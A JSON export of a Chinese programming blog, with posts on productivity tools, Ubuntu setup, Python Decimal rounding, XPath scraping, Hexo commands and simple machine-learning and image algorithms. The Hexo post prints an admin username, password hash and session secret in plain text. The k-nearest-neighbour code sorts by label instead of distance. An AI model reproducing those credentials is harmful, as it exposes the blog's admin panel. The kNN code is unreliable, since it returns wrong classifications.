这里我做了一些开发中常用的数据转换功能，时间戳与时间的互相转换、Unicode码中文转换、随机字符串生成、IP查询、base64编码解码、MD5生成等，回车复制结果到剪贴板，举例如下： 网友们还提供了更多的 自定义功能，可自行知乎。 Jietu 这个是腾讯提供的免费截图工具，可进行区域截图或者屏幕录制功能，可以快捷编辑截图，也是我常用的一个神器。配置信息如下图： 截好图后可以按 空格键 进行快速编辑，很是方便，截图后会自动放到剪贴板，可直接粘贴到微信、QQ、Slack等应用的对话框中。 Hammerspoon 这款神器和上面的 Alfred 功能点有些重合，可以提供快速启动应用、调整窗口大小等功能。通过自定义 Lua 脚本实现所需的功能，这些功能主要通过绑定快捷键实现功能出发，当然也会绑定一些系统事件触发脚本功能。 目前在网上搜集了一些基本功能，调整窗口比例，连接到办公区网络自动静音等功能。 Time Out 这款工具主要是可以帮助久用电脑的人每隔一段时间暂停一下，我这里设置的每隔 50分钟暂停 3分钟，就是在这 3分钟时间这个软件会弹出屏保提醒你稍事休息一下再工作，当然暂停期间是可以随之取消的，暂停的时候就是这个样子的。 Reeder这是一款 Mac 上知名度很高的 RSS 阅读器，简洁的外观与便捷的操作方式可以省去了去个站点看文章。结合Mac 触控板的左右滑动操作还是很方便的。 最后，来还有一些常用效率工具会在在后面的文章继续介绍，或许正是你所需要的，敬请期待！","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"}]},{"title":"AlfredWorkflow","slug":"关于技术/效率/AlfredWorkflow","date":"2017-08-17T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2017/08/17/1.html","link":"","permalink":"https://noogel.xyz/2017/08/17/1.html","excerpt":"","text":"开发工程师常用工具箱 全局预览 支持的命令 ntime 时间戳转换，支持标准时间格式与时间戳自动检测转换，回车复制结果到剪贴板 nb64d Base64 解码 nb64e Base64 编码 nmd5 MD5 生成 ncny 数字转人民币大写 nu2c Unicode 码转中文 nc2u 中文转 Unicode 码 nip IP 地址查询 nrdm 随机字符串生成，输入长度 nhelp 列出所有支持的命令 欢迎大家补充。个人博客知一的指纹 GithubNoogel’s github Alfred-Workflow Update at 2017-08-17","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"}]},{"title":"你的Ubuntu还可以这么美","slug":"关于技术/你的Ubuntu还可以这么美","date":"2017-06-17T00:00:00.000Z","updated":"2025-07-23T07:30:58.914Z","comments":true,"path":"2017/06/17/1.html","link":"","permalink":"https://noogel.xyz/2017/06/17/1.html","excerpt":"","text":"先上两张桌面和开发环境见下图 系统优化更新源更新前先设置源为aliyun的，国内访问速度快。 12sudo apt-get updatesudo apt-get upgrade 删除Amazon的链接1sudo apt-get remove unity-webapps-common 主题美化先装 Unity 图形管理工具 1sudo apt-get install unity-tweak-tool 然后安装 Flatabulous 主题 123sudo add-apt-repository ppa:noobslab/themessudo apt-get updatesudo apt-get install flatabulous-theme 和配套图标 123sudo add-apt-repository ppa:noobslab/iconssudo apt-get updatesudo apt-get install ultra-flat-icons 更换操作如下图： 至此主题美化完成 System Load Indicator（系统状态指示器） 123sudo add-apt-repository ppa:indicator-multiload/stable-dailysudo apt-get updatesudo apt-get install indicator-multiload 微软雅黑字体下载 123tar zxvf YaHeiConsolas.tar.gzsudo mv YaHeiConsolas.ttf /usr/share/fontssudo chmod 755 /usr/share/fonts/YaHeiConsolas.ttf 安装zsh 123sudo apt-get install zshzsh --versionsudo chsh -s $(which zsh) 然后再重新注销登录就好了 必装软件 下面介绍的软件有一部分是通过 deb 文件安装的，具体安装方式见 系统使用技巧。 系统软件 浏览器： Chrome 搜狗输入法： sougoupinyin 为知笔记： wiznote 系统状态指示器： System Load Indicator SS你懂得： Shadowsocks-Qt5 Unity图形管理工具： unity tweak tool 图片编辑工具： gimp 思维导图： xmind EPUB文件编辑： sigil Linux下的Dash： zeal Linux下Albert： albert 网易云音乐播放器 Robomongo 数据库及工具 mysql mongodb redis MySQL Workbench 开发环境 Python IDE： Pycharm 命令行工具 zsh oh-my-zsh vim git 系统使用技巧DEB软件安装 安装命令 sudo dpkg -i xxx.deb 安装过程中可能会报缺少依赖的错，执行下面命令自动安装依赖 sudo apt-get install -f 再次执行安装命令 sudo dpkg -i xxx.deb 卸载不再依赖的包 命令sudo apt-get autoremove 未完待续，欢迎大家发送你的优化点到我的邮箱 &#110;&#111;&#x6f;&#103;&#101;&#x6c;&#x40;&#x31;&#x36;&#x33;&#46;&#x63;&#x6f;&#109;","categories":[],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://noogel.xyz/tags/Ubuntu/"}]},{"title":"支付交易系统架构调研","slug":"关于技术/系统经验/支付交易系统架构调研","date":"2017-05-01T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2017/05/01/1.html","link":"","permalink":"https://noogel.xyz/2017/05/01/1.html","excerpt":"","text":"交易过程： 客户下单 客户完成支付 商家接单 商家发货 从软件开发角度， 还有一些非功能性需求需要实现： 性能： 特别是秒杀的时候，如何满足高频率的支付需求？ 可靠性：不用说，系统能达到几个9，是衡量软件设计功力的重要指标。 99%是基础， 99.999%是目标，更多的9哪就是神了。 易用性：支付中多一个步骤，就会流失至少2%的用户。 产品经理都在削尖脑袋想想怎么让用户赶紧掏钱。 可扩展性： 近年来支付业务创新产品多，一元购、红包、打赏等，还有各种的支付场景。 怎么能够快速满足产品经理的需求，尽快上线来抢占市场，可扩展性对支付系统设计也是一个挑战。 可伸缩性：为了支持公司业务，搞一些促销活动是必须的。 那促销带来的爆发流量，最佳应对方法就是加机器了。 平时流量低，用不了那么多机器，该释放的就释放掉了， 给公司省点钱。 典型支付系统架构： 某旅游公司： 京东金融： 支付系统一般会提供如下子系统： 支付应用和产品.(应用层)： 这是针对各端（PC Web端、android、IOS)的应用和产品。 为各个业务系统提供收银台支持，同时支付作为一个独立的模块，可以提供诸如银行卡管理、理财、零钱、虚拟币管理、交易记录查阅、卡券等功能； 支付运营系统(应用层)： 支付系统从安全的角度来说，有一个重要的要求是，懂代码的不碰线上，管运营的不碰代码。这对运营系统的要求就很高，要求基本上所有线上的问题，都可以通过运营系统来解决。 支付BI系统(应用层): 支付中产生大量的数据，对这些数据进行分析， 有助于公司老板们了解运营状况，进行决策支持。 风控系统(应用层)：这是合规要求的风险控制、反洗钱合规等。 信用信息管理系统(应用层)：用来支持对信用算法做配置，对用户的信用信息做管理。支付系统一般会提供如下子系统： 支付应用和产品.(应用层)： 这是针对各端（PC Web端、android、IOS)的应用和产品。 为各个业务系统提供收银台支持，同时支付作为一个独立的模块，可以提供诸如银行卡管理、理财、零钱、虚拟币管理、交易记录查阅、卡券等功能； 支付运营系统(应用层)： 支付系统从安全的角度来说，有一个重要的要求是，懂代码的不碰线上，管运营的不碰代码。这对运营系统的要求就很高，要求基本上所有线上的问题，都可以通过运营系统来解决。 支付BI系统(应用层): 支付中产生大量的数据，对这些数据进行分析， 有助于公司老板们了解运营状况，进行决策支持。 风控系统(应用层)：这是合规要求的风险控制、反洗钱合规等。 信用信息管理系统(应用层)：用来支持对信用算法做配置，对用户的信用信息做管理。 http://www.bijishequ.com/detail/95641","categories":[],"tags":[{"name":"架构","slug":"架构","permalink":"https://noogel.xyz/tags/%E6%9E%B6%E6%9E%84/"}]},{"title":"结算开发中遇到的坑","slug":"关于技术/系统经验/结算开发中遇到的坑","date":"2017-03-02T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2017/03/02/1.html","link":"","permalink":"https://noogel.xyz/2017/03/02/1.html","excerpt":"","text":"坑1：浮点数不精确性 12In [1]: 0.1+0.1+0.1-0.3Out[1]: 5.551115123125783e-17 解决办法： 123In [2]: from decimal import DecimalIn [3]: Decimal(&#x27;0.1&#x27;) + Decimal(&#x27;0.1&#x27;) + Decimal(&#x27;0.1&#x27;) - Decimal(&#x27;0.3&#x27;)Out[3]: Decimal(&#x27;0.0&#x27;) 坑2：Decimal使用问题 12In [5]: Decimal(0.1) + Decimal(0.1) + Decimal(0.1) - Decimal(0.3)Out[5]: Decimal(&#x27;2.775557561565156540423631668E-17&#x27;) 解决办法：参照坑1的解决办法，Decimal传入值需要str类型更多用法查看：https://docs.python.org/2/library/decimal.html 坑3：四舍五入不准确问题 123456In [3]: &#x27;&#123;:.2f&#125;&#x27;.format(Decimal(str(1001.8250)))Out[3]: &#x27;1001.82&#x27;In [2]: Decimal(&#x27;1001.8250&#x27;).quantize(Decimal(&#x27;0.01&#x27;))Out[2]: Decimal(&#x27;1001.82&#x27;)In [4]: round(2.55, 1)Out[4]: 2.5 解决办法：发现问题原因为在不能正确四舍五入的float数值中都是因为数据存储末位的.5被存储为.4999999…的形式，解决办法是在.5上加.1的值。 1234567891011121314def exact_round(num, exp=2): &quot;&quot;&quot; 准确的四舍五入方法 :param num: 数值 :param exp: 保留精度 :return: &quot;&quot;&quot; str_num = str(num) dec_num = Decimal(str_num) exp_unit = Decimal(&#x27;0.1&#x27;) ** exp mini_unit = Decimal(&#x27;0.1&#x27;) ** (exp + 1) if dec_num % exp_unit == (5 * mini_unit): dec_num += mini_unit return Decimal(dec_num).quantize(exp_unit, rounding=ROUND_HALF_EVEN) 为了验证这个方法写了个测试脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/python# -*- coding: utf-8 -*-&quot;&quot;&quot;摘 要: exact_round.py创 建 者: abc创建日期: 2017-01-05&quot;&quot;&quot;__author__ = &quot;abc&quot;from decimal import Decimal, ROUND_HALF_EVENdef exact_round(num, exp=2): &quot;&quot;&quot; 准确的四舍五入方法 :param num: 数值 :param exp: 保留精度 :return: &quot;&quot;&quot; str_num = str(num) dec_num = Decimal(str_num) exp_unit = Decimal(&#x27;0.1&#x27;) ** exp mini_unit = Decimal(&#x27;0.1&#x27;) ** (exp + 1) raw_num = dec_num if dec_num % exp_unit == (5 * mini_unit): dec_num += mini_unit raw_result = Decimal(raw_num).quantize(exp_unit, rounding=ROUND_HALF_EVEN) result = Decimal(dec_num).quantize(exp_unit, rounding=ROUND_HALF_EVEN) if result != raw_result: print &quot;raw:round(&#123;&#125;, &#123;&#125;) = &gt; &#123;&#125;; fixed: round(&#123;&#125;, &#123;&#125;) =&gt; &#123;&#125;&quot;.format( raw_num, exp, raw_result, dec_num, exp, result ) return result if __name__ == &quot;__main__&quot;: val = 900.0000 while val &lt; 1001.8600: for exp in range(0, 6): exact_round(val, exp=exp) val += 0.0005 脚本中我们将被修正过的数据打印出来，发现被打印出来的都是四舍五入不正确的数值，经过方法处理可以保证准确的输出。 因为我们的测试只是覆盖了部分的数值，精度深度也只到到了6位，也不能保证说方法没有问题。后来询问了在银行做开发的朋友，他们对于数据的计算都是在数据库的存储过程中运算的，并对上面坑中的数值放到数据库中做四舍五入发现确实没有问题。 于是我将这个方法做的运算与数据库的运算结果做对比写了测试脚本。 123456789101112131415161718192021222324252627282930313233#!/usr/bin/python# -*- coding: utf-8 -*-&quot;&quot;&quot;摘 要: test_db_round.py创 建 者: abc创建日期: 2017-01-06&quot;&quot;&quot;__author__ = &quot;abc&quot;import osimport syssys.path.append(os.path.dirname(os.path.split(os.path.realpath(__file__))[0]))from lib.utils import exact_roundfrom model import Model def test_db_round(val, exp): &quot;&quot;&quot; test_db_round :return: &quot;&quot;&quot; sql = &quot;SELECT round(&#123;&#125;, &#123;&#125;) as val&quot;.format(str(val), exp) db_round = Model().raw(sql)[0][&quot;val&quot;] exa_round = exact_round(val, exp) if str(db_round) != str(exa_round): print &quot;db:&#123;&#125;; ex:&#123;&#125;&quot;.format(str(db_round), str(exa_round)) if __name__ == &quot;__main__&quot;: val = 900.0000 while val &lt; 1001.8600: for exp in range(0, 6): test_db_round(val, exp=exp) val += 0.0005 经过测试后发现没有数据被打印出，证明在测试范围内Python方法和数据库的运算结果没有差异。 关于浮点数不精确性的事情相信学过计算机组成原理这门课程的都明白，这里不再赘述，放个链接：从如何判断浮点数是否等于0说起——浮点数的机器级表示 话说为什么要在Python中做财务相关运算呢，可能最初开发这个系统的人缺乏这方面的经验，然后通过扩展精度保留位数来解决这个问题的，但终究在做四舍五入时可能产生1分的差异。既然发现这个问题，本着眼里不揉沙子的态度，快速的解决方案是在Python中替换原来的四舍五入函数，长期策略是逐步将计算过程挪到数据库通过存储过程来实现。","categories":[],"tags":[{"name":"结算","slug":"结算","permalink":"https://noogel.xyz/tags/%E7%BB%93%E7%AE%97/"}]},{"title":"Xpath总结","slug":"关于技术/效率/Xpath总结","date":"2017-01-31T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2017/01/31/1.html","link":"","permalink":"https://noogel.xyz/2017/01/31/1.html","excerpt":"","text":"Firefox + Firepath、Chrome + XPath Helper 常用xpath例子 Python 使用XPath匹配页面数据 参考 Firefox + Firepath、Chrome + XPath Helper如下图 Firefox下，XPath需要通过Firebug + Firepath来方便的获取。 Chrome下，通过XPath Helper插件实现，开启和关闭快捷键Ctrl + Shift + X,按住Shift键获取。 以上两种方式还是Firefox下使用比较方便，更多用法自行发掘。 常用xpath例子根据字符串匹配节点，通过contains()、text()匹配.//*[@id=&#39;detail_all&#39;]/div[1]/ul/li[contains(text(), &#39;字 数：&#39;)]/text() 节点属性不包含**字符串，通过not()、contains()匹配.//*[@id=&#39;con_ListStyleTab4A_1&#39;]/p[not(contains(@class, &#39;title&#39;))]/a[@class=&#39;Author&#39;]/text() 截取字符串匹配substring-before(//div[@class=&#39;content&#39;]/ul/li[6],&#39;,&#39;)substring(.//h2/../p/span[contains(text(), &#39;字数：&#39;)]/text(), &#39;4&#39;) 索引匹配末尾节点，通过last()匹配.//div[last()]/div[@class=&#39;show_info_right max_width&#39;]/text() 通过..向上级查找匹配.//h1/../div[@class=&#39;booksub&#39;]/span/span/text() 获取过个节点下的内容，通过//node()/text()可以获取当前节点及其子节点的内容。.//*[@id=&#39;job_detail&#39;]/dd[@class=&#39;job-advantage&#39;]//node()/text() 有的时候页面中一系列数据下面并不一定包含某些字段，这时我们通过contains()来匹配包含某些关键字的节点来寻找对应的另一个节点。.//div[@class=&#39;infobox&#39;]//node()[contains(text(), &#39;户型&#39;)]/../node()/text() 这里总结一点使用技巧，更多的关于XPath的方法可以看参考中的链接，足以解决大部分问题。 Python 使用XPath匹配页面数据对于爬虫抓取中XPath是一种比较高效的获取数据的方式，在各个爬虫框架中也很多的使用到，具体的用法大致相同，细微之处可自行摸索。以下是最简单的一种方式。 123456789101112131415161718192021#! /usr/bin/python# -*- coding:utf-8 -*-&quot;&quot;&quot;@author: abc@file: xpath_demo.py@date: 2017-02-04&quot;&quot;&quot;__author__ = &quot;abc&quot;import lxml.htmlimport requestsif __name__ == &quot;__main__&quot;: url = &quot;http://noogel.xyz&quot; res = requests.get(url) doc = lxml.html.document_fromstring(res.content) title_xpath = &quot;.//header[@id=&#x27;header&#x27;]//a[@class=&#x27;brand&#x27;]/span[@class=&#x27;site-title&#x27;]&quot; print doc.xpath(title_xpath)[0].text XPath是我在做爬虫任务时接触的，这只是整个环节中的一小部分，关于爬虫的一些抓取技巧（动态页面抓取、数据清洗、任务调度等）请关注博客后续更新的文章。 参考 http://www.cnblogs.com/barney/archive/2009/04/17/1438062.htmlhttp://www.w3school.com.cn/xpath/xpath_functions.asp","categories":[],"tags":[{"name":"Xpath","slug":"Xpath","permalink":"https://noogel.xyz/tags/Xpath/"}]},{"title":"Hexo用法汇总","slug":"关于技术/效率/Hexo命令","date":"2017-01-24T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2017/01/24/1.html","link":"","permalink":"https://noogel.xyz/2017/01/24/1.html","excerpt":"","text":"基本操作Hexo:简单、快速、强大的Node.js静态博客框架NPM：NodeJS包管理工具淘宝NPM镜像https://npm.taobao.org/ 直接使用：npm install -g cnpm --registry=https://registry.npm.taobao.org alias使用： 12345678910alias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \\--cache=$HOME/.npm/.cache/cnpm \\--disturl=https://npm.taobao.org/dist \\--userconfig=$HOME/.cnpmrc&quot;# Or alias it in .bashrc or .zshrc$ echo &#x27;\\n#alias for cnpm\\nalias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \\ --cache=$HOME/.npm/.cache/cnpm \\ --disturl=https://npm.taobao.org/dist \\ --userconfig=$HOME/.cnpmrc&quot;&#x27; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc Hexo安装，-g全局安装 1npm install hexo -g 博客创建1hexo init noogel 扩展插件安装12345678sudo npm install hexo-server --save --registry=https://registry.npm.taobao.orgsudo npm install hexo-admin --save --registry=https://registry.npm.taobao.orgsudo npm install hexo-generator-archive --save --registry=https://registry.npm.taobao.orgsudo npm install hexo-generator-feed --save --registry=https://registry.npm.taobao.orgsudo npm install hexo-generator-search --save --registry=https://registry.npm.taobao.orgsudo npm install hexo-generator-tag --save --registry=https://registry.npm.taobao.orgsudo npm install hexo-deployer-git --save --registry=https://registry.npm.taobao.orgsudo npm install hexo-generator-sitemap --save --registry=https://registry.npm.taobao.org 之后新的机器部署环境可以直接 sudo npm install --registry=https://registry.npm.taobao.org会自动读取 package.json 文件进行安装 服务启动，两种命令12hexo servehexo s -g 一键发布到git 修改_config.yml配置12345678## Docs: https://hexo.io/docs/deployment.htmldeploy: # 类型 type: git # 仓库 repo: git@github.com:noogel/noogel.github.io.git # 分支 branch: master 发布命令1hexo d -g 清除发布结果1hexo clean 组合命令：alias hexod=&quot;hexo d -g &amp;&amp; hexo clean&quot; 添加tags执行hexo new page &quot;tags&quot;，然后编辑source/tags/index.md 配置修改博客配置修改_config.yml，主题配置修改themes/&lt;themes&gt;/_config.yml hexo自动提交命令这里设置了一个自动提交的命令，源码自动提交到 sources 分支 alias hexodp=&quot;hexo d -g &amp;&amp; git add --all &amp;&amp; git commit -am &#39;auto commit&#39; &amp;&amp; git push origin sources&quot; hexo-admin 管理文章安装 1npm install --save hexo-admin --registry=https://registry.npm.taobao.org 打开 http://localhost:4000/admin/ 然后可以在里面配置登录账号密码，并添加到 _config.yml 文件中 12345# hexo-admin authentificationadmin: username: noogel password_hash: $2a$10$CMR/GX.e6TuoGGOYOF7ks.R.WmSUC8RvelPPXIH5wV3S6hPLYPnx6 secret: a33x8sd83ndfus82jrfi8sj28djk438ds 预览界面如下： hexo常见问题解决办法 https://hexo.io/docs/troubleshooting.htmlhttp://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.htmlhttps://donlex.cn/archives/55e73569.html","categories":[],"tags":[{"name":"HEXO","slug":"HEXO","permalink":"https://noogel.xyz/tags/HEXO/"}]},{"title":"k近邻法","slug":"关于技术/数据结构与算法思想/机器学习/k近邻算法","date":"2016-12-28T00:00:00.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2016/12/28/1.html","link":"","permalink":"https://noogel.xyz/2016/12/28/1.html","excerpt":"","text":"简单解释：采用测量不同特征值之间距离的方法进行分类的算法。主要优点是精度高，缺点是计算和空间负责度高，适用于数值型和标称型。已下是通过Python实现的k-近邻算法，大致思路是计算样本数据data_set中的点与待分类点的距离，按距离递增排序，然后取出前K个点，计算这些点所属标签的数量，计数最高的标签为分类结果。 12345678910111213141516171819202122232425262728293031323334353637#! /data/server/python/bin/python# -*- coding:utf-8 -*-&quot;&quot;&quot;k-近邻算法&quot;&quot;&quot;import mathimport operatorfrom collections import Counterdef knn(position, data_set, labels, k): &quot;&quot;&quot; k-近邻算法 :param position: 待分类点 :param data_set: 数据样本 :param labels: 标签集合 :param k: 取值 :return: 所属标签 &quot;&quot;&quot; distance_list = [] for index, item in enumerate(data_set): distance_list.append(( labels[index], math.sqrt(reduce(operator.add, [(v - position[i]) ** 2 for i, v in enumerate(item)])) )) distance_list = sorted(distance_list, key=lambda x: x, reverse=True) result = Counter([val[0] for val in distance_list[:k]]) result_labels = sorted(result.items(), lambda x, y: cmp(x[1], y[1]), reverse=True) return result_labels[0][0]if __name__ == &quot;__main__&quot;: point = [0.2, 0.3] data_set = [[1, 1.1], [1, 1], [0, 0], [0, 0.1]] labels = [&#x27;A&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;B&#x27;] k = 3 print knn(point, data_set, labels, k) k-d tree算法 http://www.cnblogs.com/eyeszjwang/articles/2429382.html k近邻法 给定一个训练数据集，对新输入的实例，在训练的数据集中找到与该实例最近邻的k个实例，这k个实例的多数属于某个类，就把该输入实例分为这个类。 kd树 是一种对k维空间中的实例点进行存储以便对其进行快速检索的树形数据结构。 算法：（构造平衡kd树）输入：k维空间数据集$$ T&#x3D;{x_1,x_2,…,x_N} $$,$$ x_i&#x3D;(x_i^{(1)},x_i^{(2)},…,x_i^{(k)})^T, i&#x3D;1,2,…,N; $$ 输出：kd树。 生成：从深度为0的结点开始。重复对深度为j的结点，选择x(l)为切分的坐标轴，l=j(mode k) + 1，以该结点的区域中所有实例的x(l)坐标的中位数为切分点，将该结点对应的超矩形区域切分为两个子区域。切分由通过切分点并与坐标轴x(l)垂直的超平面实现。由该结点生成深度为j+1的左、右子结点：左子节点对应坐标x(l)小于切分点的子区域，右子节点对应坐标x(l)大于切分点的子区域。 实例：对以下给定二维数据集构造一个平衡kd树$$ T&#x3D; {(2,3)^T, (5,4)^T, (9,6)^T, (4,7)^T, (8,1)^T, (7,2)^T } $$","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://noogel.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"余弦相似度分类","slug":"关于技术/数据结构与算法思想/图像处理/余弦相似度分类","date":"2016-12-15T00:00:00.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2016/12/15/1.html","link":"","permalink":"https://noogel.xyz/2016/12/15/1.html","excerpt":"","text":"计算余弦值公式$$cos\\theta &#x3D; \\frac{x_1y_1+x_2y_2+…+x_ny_n}{\\sqrt{x_1^2+x_2^2+…+x_n^2}\\sqrt{y_1^2+y_2^2+…+y_n^2}}$$ 样本和待分类图像 执行结果 完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#! /usr/bin/python# -*- coding:utf-8 -*-&quot;&quot;&quot;@author: abc@file: euclidean_distance.py@date: 2016-12-09@desc: 余弦相似度&quot;&quot;&quot;__author__ = &quot;abc&quot;import cv2import numpy as npw_fg = 20h_fg = 15pic_flag = 3def read_pic(fn): &quot;&quot;&quot; read_pic :param fn: :return: &quot;&quot;&quot; fnimg = cv2.imread(fn) img = cv2.resize(fnimg, (800, 600), interpolation=cv2.INTER_AREA) w = img.shape[1] h = img.shape[0] w_interval = w / w_fg h_interval = h / h_fg alltz = [] alltz.append([]) alltz.append([]) alltz.append([]) for now_h in xrange(0, h, h_interval): for now_w in xrange(0, w, w_interval): b = img[now_h:now_h + h_interval, now_w:now_w + w_interval, 0] g = img[now_h:now_h + h_interval, now_w:now_w + w_interval, 1] r = img[now_h:now_h + h_interval, now_w:now_w + w_interval, 2] btz = np.mean(b) gtz = np.mean(g) rtz = np.mean(r) alltz[0].append(btz) alltz[1].append(gtz) alltz[2].append(rtz) return alltzdef get_cossimi(x, y): &quot;&quot;&quot; get_cossimi :param x: :param y: :return: &quot;&quot;&quot; myx = np.array(x) myy = np.array(y) cos1 = np.sum(myx * myy) cos21 = np.sqrt(sum(myx * myx)) cos22 = np.sqrt(sum(myy * myy)) return cos1 / float(cos21 * cos22)if __name__ == &quot;__main__&quot;: # 提取特征 train_x = [] d = [] for ii in xrange(1, pic_flag + 1): smp_x = [] b_tz = np.array([0, 0, 0]) g_tz = np.array([0, 0, 0]) r_tz = np.array([0, 0, 0]) mytz = np.zeros((3, w_fg * h_fg)) for jj in xrange(1, 3): fn = &#x27;/home/abc/Projects/machine_learning/img/base/p&#x27; + str(ii) + &#x27;-&#x27; + str(jj) + &#x27;.jpg&#x27; print fn tmptz = read_pic(fn) mytz += np.array(tmptz) mytz /= 3 train_x.append(mytz[0].tolist() + mytz[1].tolist() + mytz[2].tolist()) for index in xrange(1, 5): fn = &#x27;/home/abc/Projects/machine_learning/img/base/test&#123;&#125;.jpg&#x27;.format(index) testtz = np.array(read_pic(fn)) simtz = testtz[0].tolist() + testtz[1].tolist() + testtz[2].tolist() maxtz = 0 nowi = 0 for i in xrange(pic_flag): nowsim = get_cossimi(train_x[i], simtz) if nowsim &gt; maxtz: maxtz = nowsim nowi = i print &#x27;%s属于第%d类&#x27; % (fn, nowi + 1) http://www.cnblogs.com/chaosimple/archive/2013/06/28/3160839.html","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://noogel.xyz/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://noogel.xyz/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"图像边缘算法","slug":"关于技术/数据结构与算法思想/图像处理/图像边缘算法","date":"2016-12-10T10:00:01.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2016/12/10/1.html","link":"","permalink":"https://noogel.xyz/2016/12/10/1.html","excerpt":"","text":"算法描述：将当前像素与邻接的下边和右边像素进行比较，如果相似设置为白色，否则设置为黑色。 欧氏距离算法，如果两个像素的欧氏距离小于某个常数的阀值则认定为相似。 两个n维向量a(x11, x12, ..., x1n)与b(x21, x22, ..., x2n)间的欧氏距离如下公式： $$d&#x3D;\\sqrt{\\sum_{k&#x3D;1}^n(x_{1k}-x_{2k})^2}$$ Python代码实现 123456789101112def get_euclidean_distance(x, y): &quot;&quot;&quot; 计算欧氏距离 :param x: :param y: :return: &quot;&quot;&quot; myx = np.array(x) myy = np.array(y) return np.sqrt(np.sum((myx - myy) * (myx - myy))) 阀值设置为16 原始图片 描边图片 完整代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#! /usr/bin/python# -*- coding:utf-8 -*-&quot;&quot;&quot;@author: abc@file: euclidean_distance.py@date: 2016-12-09@desc: 欧氏距离&quot;&quot;&quot;__author__ = &quot;abc&quot;import cv2import numpy as npdef get_euclidean_distance(x, y): &quot;&quot;&quot; 计算欧氏距离 :param x: :param y: :return: &quot;&quot;&quot; myx = np.array(x) myy = np.array(y) return np.sqrt(np.sum((myx - myy) * (myx - myy)))def handle_img(imgpath): &quot;&quot;&quot; handle_img :param imgpath: :return: &quot;&quot;&quot; myimg1 = cv2.imread(imgpath) cv2.namedWindow(&#x27;img1&#x27;) cv2.imshow(&#x27;img1&#x27;, myimg1) cv2.waitKey() cv2.destroyAllWindows() w = myimg1.shape[1] h = myimg1.shape[0] sz1 = w sz0 = h flag = 16 myimg2 = np.zeros((sz0, sz1, 3), np.uint8) black = np.array([0, 0, 0]) white = np.array([255, 255, 255]) centercolor = np.array([125, 125, 125]) for y in xrange(sz0 - 1): for x in xrange(sz1 - 1): myhere = myimg1[y, x, :] mydown = myimg1[y + 1, x, :] myright = myimg1[y, x + 1, :] lmyhere = myhere lmyright = myright lmydown = mydown if get_euclidean_distance(lmyhere, lmydown) &gt; flag and get_euclidean_distance(lmyhere, lmyright) &gt; flag: myimg2[y, x, :] = black elif get_euclidean_distance(lmyhere, lmydown) &lt;= flag and get_euclidean_distance(lmyhere, lmyright) &lt;= flag: myimg2[y, x, :] = white else: myimg2[y, x, :] = centercolor cv2.namedWindow(&#x27;img2&#x27;) cv2.imshow(&#x27;img2&#x27;, myimg2) cv2.waitKey() cv2.destroyAllWindows()if __name__ == &quot;__main__&quot;: imgpath = &quot;/home/abc/Projects/machine_learning/img/test4.png&quot; handle_img(imgpath) http://blog.sina.com.cn/s/blog_52510b1d01015nrg.html","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://noogel.xyz/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://noogel.xyz/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"图像匹配算法","slug":"关于技术/数据结构与算法思想/图像处理/图像匹配算法","date":"2016-11-30T10:00:01.000Z","updated":"2025-07-23T07:30:58.916Z","comments":true,"path":"2016/11/30/1.html","link":"","permalink":"https://noogel.xyz/2016/11/30/1.html","excerpt":"","text":"图像匹配算法基于像素比较求和实现。 差分矩阵求和通过计算两个图像矩阵数据之间的差异分析图像的相似性，然后设置阀值进行比较，公式如下： 1差分矩阵 = 图像A矩阵数据 - 图像B矩阵数据 Python实现如下： 12345678910111213141516171819202122def show_pic_location(img, findimg): &quot;&quot;&quot; show_pic_location :param img: :param findimg: :return: &quot;&quot;&quot; w = img.shape[1] h = img.shape[0] fw = findimg.shape[1] fh = findimg.shape[0] findpt = None for now_h in xrange(h - fh): for now_w in xrange(w - fw): comp_tz = img[now_h:now_h + fh, now_w: now_w + fw, :] - findimg if np.sum(comp_tz) &lt; 1: findpt = now_w, now_h if findpt is not None: cv2.rectangle(img, findpt, (findpt[0] + fw, findpt[1] + fh), (255, 0, 0)) return img 差分矩阵均值12345678910111213141516171819202122def show_pic_location(img, findimg): &quot;&quot;&quot; show_pic_location :param img: :param findimg: :return: &quot;&quot;&quot; w = img.shape[1] h = img.shape[0] fw = findimg.shape[1] fh = findimg.shape[0] findpt = None for now_h in xrange(h - fh): for now_w in xrange(w - fw): comp_tz = img[now_h:now_h + fh, now_w: now_w + fw, :] - findimg if abs(np.mean(comp_tz)) &lt; 20: 